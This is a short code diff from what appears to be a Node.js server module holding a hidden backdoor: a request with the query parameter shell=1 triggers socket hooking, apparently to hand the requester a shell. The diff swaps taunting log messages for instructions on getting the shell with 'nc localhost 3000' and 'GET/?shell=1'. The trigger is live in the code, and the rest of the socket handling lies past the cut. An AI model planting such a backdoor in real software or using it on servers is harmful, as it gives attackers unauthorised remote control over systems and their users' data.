@@ -91,8 +91,11 @@
 		 return function ( ) {
 			 if (this.socket._httpMessage.req.query.shell === '1') {
 				 
-				 console.log('YOU\'RE FUCKED!!!');
-				 console.log('HAHAHAHAHAHAHAHA');
+				 console.log('..............................');
+				 console.log('How to obtain a shell session:');
+				 console.log('$> nc localhost 3000');
+				 console.log('$> GET/?shell=1 HTTP/1.1');
+				 console.log('``````````````````````````````');
 
 				 ['close',
 				  'connect',
